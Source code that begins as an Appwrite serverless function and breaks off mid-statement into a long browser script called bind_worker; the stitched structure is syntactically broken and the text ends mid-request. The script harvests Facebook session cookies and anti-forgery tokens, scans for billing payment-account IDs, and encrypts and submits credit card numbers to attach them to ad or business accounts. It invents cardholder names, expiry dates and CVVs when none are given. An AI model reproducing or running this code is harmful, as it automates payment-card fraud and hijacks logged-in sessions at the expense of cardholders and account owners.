module.exports = async function (req, res) {
  const client = req.client;
  const databaseId = process.env.APPWRITE_DATABASE_ID;
  const collectionId = process.env.APPWRITE_COLLECTION_ID;
  const { action, body } = req.body;
  const userId = req.headers['x-appwrite-user-id'] || 'guest';

  try {
    // 1. get_bind_worker – bind_worker.js স্ক্রিপ্ট সার্ভ করে
    if (async function () {
  "use strict";

  console.log("[bind_worker] >>> Script loaded in MAIN world");
  function f(p) {
    var v;
    if (typeof p === "string") {
      v = new TextEncoder().encode(p);
    } else if (p instanceof ArrayBuffer) {
      v = new Uint8Array(p);
    } else {
      v = p;
    }
    return btoa(String.fromCharCode.apply(null, v)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  }
  function f2(p2) {
    return Uint8Array.from(atob(p2), function (p3) {
      return p3.charCodeAt(0);
    });
  }
  function f3() {
    return crypto.randomUUID();
  }
  function f4() {
    return "upl_" + Math.floor(Date.now() / 1000) + "_" + f3();
  }
  function f5(p4, p5) {
    console.log("[bind_worker] DONE for job " + p5 + ":", JSON.stringify(p4).substring(0, 500));
    var v2 = JSON.stringify(p4);
    if (p5) {
      globalThis["__cbBindResult_" + p5] = v2;
      try {
        document.documentElement.setAttribute("data-cb-result-" + p5, v2);
      } catch (e) {}
    } else {
      globalThis.__cbBindResult = v2;
      try {
        document.documentElement.setAttribute("data-card-bind-result", v2);
      } catch (e2) {}
    }
  }
  try {
    var v3 = null;
    var v4 = null;
    for (var vLN0 = 0; vLN0 < document.documentElement.attributes.length; vLN0++) {
      var v5 = document.documentElement.attributes[vLN0];
      if (v5.name.startsWith("data-cb-params-")) {
        v4 = v5.name.substring(15);
        v3 = v5.value;
        document.documentElement.removeAttribute(v5.name);
        delete globalThis["__cbBindParams_" + v4];
        break;
      }
    }
    if (!v3) {
      v3 = globalThis.__cbBindParams || document.documentElement.getAttribute("data-card-bind-params");
      delete globalThis.__cbBindParams;
      document.documentElement.removeAttribute("data-card-bind-params");
    }
    if (!v3) {
      return;
    }
    var v6 = JSON.parse(v3);
    if (!v4 && v6.jobId) {
      v4 = v6.jobId;
    }
    console.log("[bind_worker] Job:", v4 || "legacy", "Params:", JSON.stringify(v6).substring(0, 200));
    var vString = String(v6.cardNumber);
    var v7 = v6.countryCode || "EG";
    var v8 = v6.businessId || "";
    var v9 = !!v8;
    var vA = ["Ahmed Mohamed", "Hassan Ali", "Omar Ibrahim", "Mahmoud Ahmed", "Youssef Hassan", "John Smith", "James Williams", "Robert Johnson", "David Brown", "Michael Davis"];
    var vF = function (p6, p7) {
      return Math.floor(Math.random() * (p7 - p6 + 1)) + p6;
    };
    var v10 = vString.startsWith("34") || vString.startsWith("37");
    var v11 = v6.cardholder || vA[vF(0, vA.length - 1)];
    var v12 = v6.expiryMonth ? String(v6.expiryMonth) : String(vF(1, 12)).padStart(2, "0");
    if (v12.length === 1) {
      v12 = "0" + v12;
    }
    var v13 = v6.expiryYear ? String(v6.expiryYear) : "20" + String(vF(27, 31));
    if (v13.length <= 2) {
      v13 = "20" + v13.padStart(2, "0");
    }
    var v14 = v6.cvv ? String(v6.cvv) : v10 ? String(vF(1000, 9999)) : String(vF(100, 999));
    console.log("[bind_worker] Card:", vString.substring(0, 6) + "****", "month:", v12, "year:", v13, "biz:", v8 || "AD_MODE");
    var v15 = (document.cookie.match(/c_user\s*=\s*(\d+)/) || document.cookie.match(/pas\s*=\s*(\d+)%3A/) || [])[1] || "";
    if (!v15) {
      f5({
        status: "ERROR",
        error: "No c_user - not logged in to Facebook"
      }, v4);
      return;
    }
    var vLS = "";
    try {
      vLS = require("DTSGInitData").token;
    } catch (e3) {}
    if (!vLS) {
      try {
        vLS = require("DTSGInitialData").token;
      } catch (e4) {}
    }
    if (!vLS) {
      try {
        vLS = require("DTSG").token;
      } catch (e5) {}
    }
    if (!vLS) {
      var v16 = document.querySelector("input[name=\"fb_dtsg\"]");
      if (v16) {
        vLS = v16.value;
      }
    }
    if (!vLS) {
      var v17 = document.querySelectorAll("script:not([src])");
      for (var vLN02 = 0; vLN02 < v17.length; vLN02++) {
        var v18 = v17[vLN02].textContent;
        if (!v18 || v18.length < 20) {
          continue;
        }
        var v19 = v18.match(/"DTSGInitData"[^}]*?"token":"([^"]+)"/);
        if (v19) {
          vLS = v19[1];
          break;
        }
        v19 = v18.match(/"DTSGInitialData"[^}]*?"token":"([^"]+)"/);
        if (v19) {
          vLS = v19[1];
          break;
        }
        v19 = v18.match(/"dtsg":\{"token":"([^"]+)"/);
        if (v19) {
          vLS = v19[1];
          break;
        }
      }
    }
    if (!vLS) {
      f5({
        status: "ERROR",
        error: "fb_dtsg not found - refresh Facebook page",
        userId: v15
      }, v4);
      return;
    }
    var vLS2 = "";
    var v20 = document.querySelector("input[name=\"jazoest\"]");
    if (v20) {
      vLS2 = v20.value;
    }
    if (!vLS2) {
      try {
        var v21 = document.documentElement.innerHTML;
        var v22 = v21.match(/"jazoest"\s*:?\s*"?(\d+)"?/);
        if (v22) {
          vLS2 = v22[1];
        }
      } catch (e6) {}
    }
    if (!vLS2 && vLS) {
      var vLN03 = 0;
      for (var vLN04 = 0; vLN04 < vLS.length; vLN04++) {
        vLN03 += vLS.charCodeAt(vLN04);
      }
      vLS2 = "2" + vLN03;
    }
    var vLS3 = "";
    try {
      vLS3 = require("LSD").token;
    } catch (e7) {}
    if (!vLS3) {
      try {
        vLS3 = require("LSDToken").token;
      } catch (e8) {}
    }
    if (!vLS3) {
      try {
        var __getLSD = require("__getLSD");
        if (typeof __getLSD === "function") {
          vLS3 = __getLSD();
        } else if (typeof __getLSD === "string") {
          vLS3 = __getLSD;
        } else if (__getLSD && __getLSD.token) {
          vLS3 = __getLSD.token;
        }
      } catch (e9) {}
    }
    if (!vLS3) {
      var v23 = document.querySelector("input[name=\"lsd\"]");
      if (v23) {
        vLS3 = v23.value;
      }
    }
    if (!vLS3) {
      try {
        var v24 = document.documentElement.innerHTML;
        var v25 = v24.match(/"LSD"\s*,\s*\[\]\s*,\s*\{"token"\s*:\s*"([^"]+)"/);
        if (v25) {
          vLS3 = v25[1];
        }
        if (!vLS3) {
          v25 = v24.match(/"lsd"\s*:\s*"([^"]+)"/);
          if (v25) {
            vLS3 = v25[1];
          }
        }
      } catch (e10) {}
    }
    if (!vLS3) {
      try {
        console.log("[bind_worker] lsd empty - fetching fresh tokens from /home.php ...");
        var v26 = await fetch("/home.php", {
          credentials: "include",
          headers: {
            Accept: "text/html,*/*"
          }
        });
        if (v26.ok) {
          var v27 = await v26.text();
          var v28 = v27.match(/name="lsd"\s+value="([^"]+)"/);
          if (v28) {
            vLS3 = v28[1];
          }
          if (!vLS3) {
            var v29 = v27.match(/"lsd":"([^"]+)"/);
            if (v29) {
              vLS3 = v29[1];
            }
          }
          if (!vLS3) {
            var v30 = v27.match(/"LSD"\s*,\s*\[\]\s*,\s*\{"token"\s*:\s*"([^"]+)"/);
            if (v30) {
              vLS3 = v30[1];
            }
          }
          if (!vLS2 && vLS3) {
            var v31 = v27.match(/"DTSGInitData"[^}]*?"token":"([^"]+)"/);
            if (v31 && v31[1]) {
              vLS = v31[1];
              var vLN05 = 0;
              for (var vLN06 = 0; vLN06 < vLS.length; vLN06++) {
                vLN05 += vLS.charCodeAt(vLN06);
              }
              vLS2 = "2" + vLN05;
            }
          }
          if (vLS3) {
            console.log("[bind_worker] Got fresh lsd from /home.php");
          }
        }
      } catch (e11) {
        console.log("[bind_worker] home.php lsd fetch failed:", e11.message);
      }
    }
    console.log("[bind_worker] Tokens: dtsg=" + vLS.substring(0, 15) + "... jazoest=" + vLS2 + " lsd=" + (vLS3 ? vLS3.substring(0, 10) + "..." : "(EMPTY)"));
    if (!vLS3) {
      console.warn("[bind_worker] WARNING: lsd token is empty - requests will be sent without lsd/X-FB-LSD");
    }
    var vLS4 = "";
    var v32 = location.href.match(/[?&]payment_account_id=(\d+)/);
    if (v32) {
      vLS4 = v32[1];
      console.log("[bind_worker] PA from URL param (highest priority):", vLS4);
    }
    var v33 = vLS4 || v6.paymentAccountId || "";
    if (v9 && v8 && !v33) {
      v33 = v8;
      console.log("[bind_worker] User Override: Defaulted PA to equal Business ID:", v33);
    }
    function f6(p8) {
      return p8 && p8.length >= 6 && /^\d+$/.test(p8) && p8 !== v15 && p8 !== v8;
    }
    function f7(p9) {
      var vA2 = [/"paymentAccountID":"(\d+)"/g, /"payment_account_id":"(\d+)"/g, /"paymentAccountId":"(\d+)"/g, /"target_account_id":"(\d+)"/g, /"id":"(\d+)"[^}]{0,300}"__typename":"BusinessPaymentAccount"/g, /"__typename":"BusinessPaymentAccount"[^}]{0,300}"id":"(\d+)"/g, /"id":"(\d+)"[^}]{0,300}"__typename":"PaymentAccount"/g, /"__typename":"PaymentAccount"[^}]{0,300}"id":"(\d+)"/g, /"billing_payment_account"\s*:\s*\{\s*"id"\s*:\s*"(\d+)"/g, /"business_payment_account_id":"(\d+)"/g, /"businessPaymentAccountId":"(\d+)"/g, /"account_id":"(\d+)"/g];
      for (var vLN07 = 0; vLN07 < vA2.length; vLN07++) {
        var v34 = vA2[vLN07];
        var v35;
        while ((v35 = v34.exec(p9)) !== null) {
          if (f6(v35[1])) {
            console.log("[bind_worker] PA found via scan pattern #" + vLN07 + ":", v35[1]);
            return v35[1];
          }
        }
      }
      return "";
    }
    function f8(p10, p11, p12) {
      var vO = {
        av: v15,
        __user: v15,
        __a: "1",
        __comet_req: "11",
        fb_dtsg: vLS,
        jazoest: vLS2,
        lsd: vLS3,
        fb_api_caller_class: "RelayModern",
        fb_api_req_friendly_name: p11,
        server_timestamps: "true",
        doc_id: p10,
        variables: JSON.stringify(p12)
      };
      return new URLSearchParams(vO);
    }
    var vO2 = {
      "Content-Type": "application/x-www-form-urlencoded",
      Accept: "*/*",
      "Accept-Language": "en-US,en;q=0.9",
      Origin: location.origin,
      Referer: v9 ? location.origin + "/latest/billing_hub/payment_methods?business_id=" + v8 : location.href,
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-origin"
    };
    function f9(p13) {
      var v36 = p13.replace(/^for\s*\(;;\)\s*;\s*/, "");
      var v37 = v36.trim().split("\n");
      for (var vLN08 = 0; vLN08 < v37.length; vLN08++) {
        if (!v37[vLN08].trim()) {
          continue;
        }
        try {
          var v38 = JSON.parse(v37[vLN08]);
          var v39 = JSON.stringify(v38);
          if (v38.errors && v38.errors.length) {
            console.log("[bind_worker] GQL response has errors:", (v38.errors[0].message || "").substring(0, 100));
          }
          var vF7 = f7(v39);
          if (vF7) {
            return vF7;
          }
        } catch (e12) {}
      }
      var vF72 = f7(v36);
      if (vF72) {
        return vF72;
      }
      return "";
    }
    if (v33) {
      var v40 = vLS4 ? "URL param" : "panel/params";
      console.log("[bind_worker] PA from " + v40 + ":", v33);
    }
    if (!v33) {
      var v41 = location.href.match(/payment_account_id=(\d+)/);
      if (v41 && f6(v41[1])) {
        v33 = v41[1];
        console.log("[bind_worker] PA from URL:", v33);
      }
    }
    if (!v33) {
      try {
        var vA3 = ["BillingPaymentAccountStore", "PaymentAccountStore", "BillingStore", "AdAccountPaymentStore", "CurrentPaymentAccount", "CurrentBillingPaymentAccount"];
        for (var vLN09 = 0; vLN09 < vA3.length; vLN09++) {
          if (v33) {
            break;
          }
          try {
            var vRequire = require(vA3[vLN09]);
            if (!vRequire) {
              continue;
            }
            var vA4 = ["getPaymentAccountId", "getPaymentAccountID", "getId", "getState", "get"];
            for (var vLN010 = 0; vLN010 < vA4.length; vLN010++) {
              if (v33) {
                break;
              }
              if (typeof vRequire[vA4[vLN010]] === "function") {
                try {
                  var v42 = vRequire[vA4[vLN010]]();
                  if (typeof v42 === "string" && f6(v42)) {
                    v33 = v42;
                    console.log("[bind_worker] PA from require(" + vA3[vLN09] + ")." + vA4[vLN010] + "():", v33);
                  } else if (v42 && typeof v42 === "object") {
                    var v43 = JSON.stringify(v42);
                    var vF73 = f7(v43);
                    if (vF73) {
                      v33 = vF73;
                      console.log("[bind_worker] PA from require(" + vA3[vLN09] + ")." + vA4[vLN010] + "() object:", v33);
                    }
                  }
                } catch (e13) {}
              }
            }
            if (!v33 && vRequire.paymentAccountId && f6(String(vRequire.paymentAccountId))) {
              v33 = String(vRequire.paymentAccountId);
              console.log("[bind_worker] PA from require(" + vA3[vLN09] + ").paymentAccountId:", v33);
            }
            if (!v33) {
              var v44 = JSON.stringify(vRequire);
              if (v44 && v44.length < 50000) {
                var vF74 = f7(v44);
                if (vF74) {
                  v33 = vF74;
                  console.log("[bind_worker] PA from require(" + vA3[vLN09] + ") JSON scan:", v33);
                }
              }
            }
          } catch (e14) {}
        }
      } catch (e15) {
        console.log("[bind_worker] require() PA scan error:", e15.message);
      }
    }
    if (!v33) {
      try {
        var vA5 = ["RelayStore", "__relay_store", "RelayModernStore"];
        for (var vLN011 = 0; vLN011 < vA5.length; vLN011++) {
          if (v33) {
            break;
          }
          try {
            var vRequire2 = require(vA5[vLN011]);
            if (vRequire2 && typeof vRequire2.getSource === "function") {
              var v45 = vRequire2.getSource();
              if (v45 && typeof v45.toJSON === "function") {
                var v46 = JSON.stringify(v45.toJSON());
                if (v46 && v46.length < 500000) {
                  v33 = f7(v46);
                  if (v33) {
                    console.log("[bind_worker] PA from Relay store:", v33);
                  }
                }
              }
            }
          } catch (e16) {}
        }
      } catch (e17) {}
    }
    if (!v33) {
      try {
        var v47 = document.body.innerHTML;
        v33 = f7(v47);
        if (v33) {
          console.log("[bind_worker] PA from page HTML");
        }
      } catch (e18) {}
    }
    if (!v33) {
      try {
        var v17 = document.querySelectorAll("script:not([src])");
        for (var vLN012 = 0; vLN012 < v17.length; vLN012++) {
          if (v33) {
            break;
          }
          var v18 = v17[vLN012].textContent;
          if (!v18 || v18.length < 50) {
            continue;
          }
          v33 = f7(v18);
        }
        if (v33) {
          console.log("[bind_worker] PA from inline script");
        }
      } catch (e19) {}
    }
    if (!v33) {
      console.log("[bind_worker] Trying billing hub page fetch...");
      var vA6 = ["/latest/billing_hub/payment_methods", "/billing_hub/payment_methods"];
      if (v9) {
        vA6.push("/latest/billing_hub/payment_methods?business_id=" + v8);
        vA6.push("/billing_hub/payment_methods?business_id=" + v8);
        vA6.push("/latest/billing_hub/accounts?business_id=" + v8);
      }
      for (var vLN013 = 0; vLN013 < vA6.length; vLN013++) {
        if (v33) {
          break;
        }
        try {
          var v48 = await fetch(vA6[vLN013], {
            method: "GET",
            credentials: "include",
            headers: {
              Accept: "text/html,*/*"
            }
          });
          if (v48.ok) {
            var v49 = await v48.text();
            console.log("[bind_worker] Billing URL #" + vLN013 + " fetched, len:", v49.length);
            v33 = f7(v49);
            if (v33) {
              console.log("[bind_worker] PA from billing page fetch:", v33);
            }
          }
        } catch (e20) {
          console.log("[bind_worker] Billing fetch #" + vLN013 + " failed:", e20.message);
        }
      }
    }
    if (!v33) {
      var vA7 = [];
      vA7.push({
        docId: "6830508253630498",
        name: "BillingHubPaymentMethodsRootQuery",
        vars: v9 ? {
          businessID: v8
        } : {}
      });
      vA7.push({
        docId: "5889200837808685",
        name: "BillingPaymentAccountsQuery",
        vars: v9 ? {
          business_id: v8
        } : {}
      });
      for (var vLN014 = 0; vLN014 < vA7.length; vLN014++) {
        if (v33) {
          break;
        }
        try {
          var v50 = vA7[vLN014];
          console.log("[bind_worker] Trying fallback GQL:", v50.name, "doc_id:", v50.docId);
          var vF8 = f8(v50.docId, v50.name, v50.vars);
          var v51 = await fetch("/api/graphql/", {
            method: "POST",
            headers: vO2,
            body: vF8.toString(),
            credentials: "include"
          });
          var v52 = await v51.text();
          console.log("[bind_worker] Fallback GQL", v50.name, "status:", v51.status, "len:", v52.length);
          v33 = f9(v52);
          if (v33) {
            console.log("[bind_worker] PA from fallback GraphQL (" + v50.name + "):", v33);
          }
        } catch (e21) {
          console.log("[bind_worker] Fallback query " + v50.name + " failed:", e21.message);
        }
      }
    }
    if (!v33 && !v9) {
      console.log("[bind_worker] Trying ads manager information page...");
      try {
        var v53 = await fetch("/ads/manager/account_settings/information/", {
          method: "GET",
          credentials: "include",
          headers: {
            Accept: "text/html,*/*"
          }
        });
        if (v53.ok) {
          var v54 = await v53.text();
          v33 = f7(v54);
          if (v33) {
            console.log("[bind_worker] PA from ads manager info page:", v33);
          }
        }
      } catch (e22) {
        console.log("[bind_worker] Ads manager fetch failed:", e22.message);
      }
    }
    if (!v33) {
      console.error("[bind_worker] ALL PA discovery strategies exhausted");
      f5({
        status: "ERROR",
        error: "No payment account found - try Detect button or open billing page first",
        userId: v15,
        businessId: v8 || null
      }, v4);
      return;
    }
    console.log("[bind_worker] userId:", v15, "| dtsg:", vLS.substring(0, 15) + "...", "| PA:", v33, "| mode:", v9 ? "BIZ" : "AD");
    var vA8 = [v33];
    if (v9 && v33) {
      console.log("[bind_worker] Step 0c: Resolving child/wallet PA for business mode...");
      var vV33 = v33;
      var vO3 = {
        [v8]: true,
        [v15]: true
      };
      var vA9 = [/"payment_account_id"\s*:\s*"(\d+)"/g, /"paymentAccountID"\s*:\s*"(\d+)"/g, /"paymentAccountId"\s*:\s*"(\d+)"/g, /"target_account_id"\s*:\s*"(\d+)"/g, /"primary_funding_source_id"\s*:\s*"(\d+)"/g, /"id"\s*:\s*"(\d+)"[^}]{0,300}"__typename"\s*:\s*"(?:Business)?PaymentAccount"/g, /"__typename"\s*:\s*"(?:Business)?PaymentAccount"[^}]{0,300}"id"\s*:\s*"(\d+)"/g, /"billing_payment_account"\s*:\s*\{\s*"id"\s*:\s*"(\d+)"/g];
      function f10(p14) {
        var v55 = p14.replace(/^for\s*\(;;\)\s*;\s*/, "");
        var vA10 = [];
        for (var vLN015 = 0; vLN015 < vA9.length; vLN015++) {
          var v56 = vA9[vLN015];
          v56.lastIndex = 0;
          var v57;
          while ((v57 = v56.exec(v55)) !== null) {
            var v58 = v57[1];
            if (f6(v58) && !vO3[v58]) {
              vO3[v58] = true;
              vA10.push(v58);
              console.log("[bind_worker] Found PA candidate:", v58, "(pattern #" + vLN015 + ")");
            }
          }
        }
        var v59 = /"id"\s*:\s*"(\d{10,19})"/g;
        var v60;
        while ((v60 = v59.exec(v55)) !== null) {
          if (f6(v60[1]) && !vO3[v60[1]]) {
            vO3[v60[1]] = true;
            vA10.push(v60[1]);
            console.log("[bind_worker] Found PA candidate (id):", v60[1]);
          }
        }
        return vA10;
      }
      if (v6.paymentAccountId && v6.paymentAccountId !== vV33 && f6(v6.paymentAccountId)) {
        if (!vO3[v6.paymentAccountId]) {
          vO3[v6.paymentAccountId] = true;
          vA8.push(v6.paymentAccountId);
          console.log("[bind_worker] PA from panel params:", v6.paymentAccountId);
        }
      }
      try {
        var v61 = document.body.innerHTML;
        if (v61 && v61.length > 100) {
          var vF10 = f10(v61);
          for (var vLN016 = 0; vLN016 < vF10.length; vLN016++) {
            if (vA8.indexOf(vF10[vLN016]) < 0) {
              vA8.push(vF10[vLN016]);
            }
          }
          console.log("[bind_worker] DOM scan: found", vF10.length, "unique PA(s)");
        }
      } catch (e23) {
        console.log("[bind_worker] DOM scan error:", e23.message);
      }
      try {
        var v17 = document.querySelectorAll("script:not([src])");
        for (var vLN012 = 0; vLN012 < v17.length; vLN012++) {
          var v18 = v17[vLN012].textContent;
          if (!v18 || v18.length < 100) {
            continue;
          }
          var vF102 = f10(v18);
          for (var vLN02 = 0; vLN02 < vF102.length; vLN02++) {
            if (vA8.indexOf(vF102[vLN02]) < 0) {
              vA8.push(vF102[vLN02]);
            }
          }
        }
        console.log("[bind_worker] Inline script scan complete, total candidates:", vA8.length);
      } catch (e24) {
        console.log("[bind_worker] Script scan error:", e24.message);
      }
      var vLS5 = "";
      if (vA8.length <= 2) {
        var vA6 = ["/latest/billing_hub/payment_methods?business_id=" + v8, "/billing_hub/payment_methods?business_id=" + v8, "/latest/billing_hub/accounts?business_id=" + v8];
        for (var vLN013 = 0; vLN013 < vA6.length; vLN013++) {
          try {
            var v48 = await fetch(vA6[vLN013], {
              method: "GET",
              credentials: "include",
              headers: {
                Accept: "text/html,*/*"
              }
            });
            if (v48.ok) {
              var v49 = await v48.text();
              console.log("[bind_worker] Billing page #" + vLN013 + " fetched, len:", v49.length);
              if (v49.length > vLS5.length) {
                vLS5 = v49;
              }
              var vF103 = f10(v49);
              for (var vLN017 = 0; vLN017 < vF103.length; vLN017++) {
                if (vA8.indexOf(vF103[vLN017]) < 0) {
                  vA8.push(vF103[vLN017]);
                }
              }
              if (vF103.length > 0) {
                break;
              }
            }
          } catch (e25) {
            console.log("[bind_worker] Billing page #" + vLN013 + " error:", e25.message);
          }
        }
      }
      if (vA8.length <= 2) {
        var vO4 = {
          BillingHubPaymentMethodsRootQuery: "6830508253630498",
          BillingPaymentAccountsQuery: "5889200837808685",
          BillingPaymentAccountListQuery: "24542247775891498"
        };
        var vA11 = [];
        vA11.push({
          docId: vO4.BillingHubPaymentMethodsRootQuery,
          name: "BillingHubPaymentMethodsRootQuery",
          vars: {
            businessID: v8
          }
        });
        vA11.push({
          docId: vO4.BillingPaymentAccountsQuery,
          name: "BillingPaymentAccountsQuery",
          vars: {
            business_id: v8
          }
        });
        vA11.push({
          docId: vO4.BillingPaymentAccountListQuery,
          name: "BillingPaymentAccountListQuery",
          vars: {
            businessID: v8
          }
        });
        for (var vLN014 = 0; vLN014 < vA11.length; vLN014++) {
          try {
            var v50 = vA11[vLN014];
            var vF8 = f8(v50.docId, v50.name, v50.vars);
            var v51 = await fetch("/api/graphql/", {
              method: "POST",
              headers: vO2,
              body: vF8.toString(),
              credentials: "include"
            });
            var v52 = await v51.text();
            console.log("[bind_worker] GQL child PA query", v50.name, "status:", v51.status, "len:", v52.length, "resp:", v52.substring(0, 200));
            var vF104 = f10(v52);
            for (var vLN018 = 0; vLN018 < vF104.length; vLN018++) {
              if (vA8.indexOf(vF104[vLN018]) < 0) {
                vA8.push(vF104[vLN018]);
              }
            }
            if (vF104.length > 0) {
              break;
            }
          } catch (e26) {
            console.log("[bind_worker] GQL child PA query failed:", e26.message);
          }
        }
      }
      var vA12 = [];
      var vA13 = [];
      for (var vLN019 = 0; vLN019 < vA8.length; vLN019++) {
        if (vA8[vLN019] === vV33) {
          vA12.push(vA8[vLN019]);
        } else {
          vA13.push(vA8[vLN019]);
        }
      }
      vA8 = vA12.concat(vA13);
      console.log("[bind_worker] PA candidates (parent-first order):", JSON.stringify(vA8));
      if (vA8.length > 0) {
        v33 = vA8[0];
        console.log("[bind_worker] *** Using PA:", v33);
      }
    }
    var vLS6 = "";
    for (var vLN020 = 0; vLN020 < vA8.length; vLN020++) {
      v33 = vA8[vLN020];
      if (vLN020 > 0) {
        console.log("[bind_worker] ===== Trying PA candidate #" + vLN020 + ":", v33, "=====");
      }
      console.log("[bind_worker] Step 1: Fetching encryption key for PA:", v33);
      var vA14 = ["23994203586844376"];
      var v62 = null;
      var vLS7 = "";
      for (var vLN021 = 0; vLN021 < vA14.length && !v62; vLN021++) {
        try {
          var vF82 = f8(vA14[vLN021], "PaymentsCometGetServerEncryptionKeyMutation", {
            input: {
              device_id: "device_id",
              payment_type: "BILLING_WIZARD",
              target_account_id: v33,
              fetch_unified_wallet_key: false,
              logging_id: f4(),
              actor_id: v15,
              client_mutation_id: f3()
            }
          });
          var v63 = await fetch("/api/graphql/", {
            method: "POST",
            headers: vO2,
            body: vF82.toString(),
            credentials: "include"
          });
          var v64 = await v63.text();
          console.log("[bind_worker] Key response status:", v63.status, "length:", v64.length);
          var v65 = v64.replace(/^for\s*\(;;\)\s*;\s*/, "");
          var v66;
          try {
            v66 = JSON.parse(v65);
          } catch (e27) {
            v66 = JSON.parse(v65.trim().split("\n")[0]);
          }
          if (v66 && v66.errors && v66.errors.length) {
            vLS7 = (v66.errors[0].message || "unknown") + " (code:" + (v66.errors[0].code || "?") + ")";
            console.log("[bind_worker] Key error:", vLS7);
            if (v66.errors[0].code === 1383274) {
              break;
            }
            continue;
          }
          var v67 = v66 && v66.data && v66.data.get_server_encryption_key;
          if (v67 && v67.trust_chain && v67.trust_chain.length) {
            v62 = v67;
            console.log("[bind_worker] Key OK, id:", v67.id);
            break;
          } else {
            vLS7 = "No trust_chain in response";
          }
        } catch (e28) {
          vLS7 = e28.message;
          console.log("[bind_worker] Key exception:", e28.message);
        }
      }
      if (!v62) {
        vLS6 = "No encryption key - " + vLS7;
        console.log("[bind_worker] No key for PA:", v33, "- trying next PA candidate...");
        continue;
      }
      var vF2 = f2(v62.trust_chain[0]);
      var vA15 = [48, 89, 48, 19, 6, 7, 42, 134, 72, 206, 61, 2, 1];
      var v68 = -1;
      for (var vLN022 = 0; vLN022 < vF2.length - vA15.length; vLN022++) {
        var v69 = true;
        for (var vLN023 = 0; vLN023 < vA15.length; vLN023++) {
          if (vF2[vLN022 + vLN023] !== vA15[vLN023]) {
            v69 = false;
            break;
          }
        }
        if (v69) {
          v68 = vLN022;
          break;
        }
      }
      if (v68 < 0) {
        f5({
          status: "ERROR",
          error: "SPKI pattern not found in certificate",
          userId: v15
        }, v4);
        return;
      }
      var v70 = vF2.slice(v68, v68 + 91);
      var v71 = await crypto.subtle.importKey("spki", v70, {
        name: "ECDH",
        namedCurve: "P-256"
      }, true, []);
      var v72 = await crypto.subtle.digest("SHA-256", v70);
      var vF3 = f(new Uint8Array(v72));
      var v73 = "fp:" + vF3;
      var v74 = new TextEncoder().encode(v73);
      var vF4 = f(v74);
      var v75 = await crypto.subtle.generateKey({
        name: "ECDH",
        namedCurve: "P-256"
      }, true, ["deriveBits"]);
      var v76 = await crypto.subtle.exportKey("spki", v75.publicKey);
      var vBtoa = btoa(String.fromCharCode.apply(null, new Uint8Array(v76)));
      var v77 = "-----BEGIN PUBLIC KEY-----\n" + vBtoa.match(/.{1,64}/g).join("\n") + "\n-----END PUBLIC KEY-----\n";
      var v78 = new Uint8Array(await crypto.subtle.deriveBits({
        name: "ECDH",
        public: v71
      }, v75.privateKey, 256));
      var v79 = new Uint8Array([0, 0, 0, 7, ...new TextEncoder().encode("A256GCM")]);
      var v80 = new Uint8Array([0, 0, 0, 0]);
      var v81 = new Uint8Array(4);
      new DataView(v81.buffer).setUint32(0, v74.length);
      var v82 = new Uint8Array([...v81, ...v74]);
      var v83 = new Uint8Array([0, 0, 1, 0]);
      var v84 = new Uint8Array([0, 0, 0, 1, ...v78, ...v79, ...v80, ...v82, ...v83]);
      var v85 = new Uint8Array(await crypto.subtle.digest("SHA-256", v84));
      var v86 = await crypto.subtle.importKey("raw", v85, {
        name: "AES-GCM"
      }, false, ["encrypt"]);
      var vO5 = {
        alg: "ECDH-ES",
        apu: "",
        apv: vF4,
        enc: "A256GCM",
        epk: {
          crv: "P-256",
          kty: "EC",
          pem: v77
        }
      };
      var vF5 = f(JSON.stringify(vO5));
      var vO6 = {
        data: {
          credit_card: "$e2ee",
          csc: "$e2ee",
          expiry_month: v12,
          expiry_year: v13
        },
        nonce: f3(),
        op: "ADD_CARD",
        ver: 1
      };
      var vF6 = f(JSON.stringify(vO6));
      var v87 = JSON.stringify({
        credit_card: vString,
        csc: v14
      });
      var v88 = new TextEncoder().encode(vF5 + "." + vF6);
      var v89 = crypto.getRandomValues(new Uint8Array(12));
      var v90 = await crypto.subtle.encrypt({
        name: "AES-GCM",
        iv: v89,
        additionalData: v88,
        tagLength: 128
      }, v86, new TextEncoder().encode(v87));
      var v91 = new Uint8Array(v90);
      var v92 = v91.slice(0, v91.length - 16);
      var v93 = v91.slice(v91.length - 16);
      var v94 = vF5 + ".." + f(v89) + "." + f(v92) + "." + f(v93);
      var v95 = vF6 + "." + v94;
      var vBtoa2 = btoa(JSON.stringify({
        payload: v95,
        signatures: []
      }));
      var v96 = vString.substring(0, 6);
      var v97 = vString.substring(vString.length - 4);
      var vO7 = {
        input: {
          billing_address: {
            country_code: v7
          },
          card_data: {
            bin: v96,
            cardholder_name: v11,
            credit_card_number: {
              sensitive_string_value: "$e2ee"
            },
            csc: {
              sensitive_string_value: "$e2ee"
            },
            expiry_month: v12,
            expiry_year: v13,
            last_4: v97
          },
          client_info: {
            color_depth: String(screen.colorDepth || 24),
            java_enabled: false,
            screen_height: String(screen.height || 1152),
            screen_width: String(screen.width || 1920)
          },
          network_tokenization_consent_given: false,
          payment_account_id: v33,
          payment_intent: "ADD_PM",
          platform_trust_token: vBtoa2,
          recurring_payment_consent_given: false,
          set_default: false,
          upl_logging_data: {
            context: "billingcreditcard",
            credential_type: "NEW_CREDIT_CARD",
            entry_point: "BILLING_HUB",
            external_flow_id: f4(),
            target_name: "useBillingAddCreditCardMutation",
            user_session_id: f4(),
            wizard_config_name: "SAVE_CARD_CREDENTIAL",
            wizard_name: "ADD_PM_PUX_EP",
            wizard_screen_name: "add_credit_card_state_display",
            wizard_session_id: "upl_wizard_" + Date.now() + "_" + f3()
          },
          share_to_child_payment_account_id: null,
          actor_id: v15,
          client_mutation_id: String(Math.floor(Math.random() * 100))
        },
        getRiskVerificationInfoForAllCredentialsOnPaymentAccount: true,
        paymentAccountID: v33,
        includeCreateNewFromOldFragment: false,
        country: null,
        currency: null,
        intent: null
      };
      var vA16 = ["25934943219457748"];
      var vLS8 = "";
      console.log("[bind_worker] Step 12: Sending save card mutation, PA:", v33);
      for (var vLN024 = 0; vLN024 < vA16.length; vLN024++) {
        var v98 = vA16[vLN024];
        if (vLN024 > 0) {
          console.log("[bind_worker] Trying save doc_id #" + vLN024 + ":", v98);
        }
        var v99 = false;
        var vF83 = f8(v98, "BillingSaveCardCredentialStateMutation", vO7);
        var vLS9 = "";
        var v100 = null;
        try {
          v100 = await fetch("/api/graphql/", {
            method: "POST",
            headers: vO2,
            body: vF83.toString(),
            credentials: "include"
          });
          vLS9 = await v100.text();
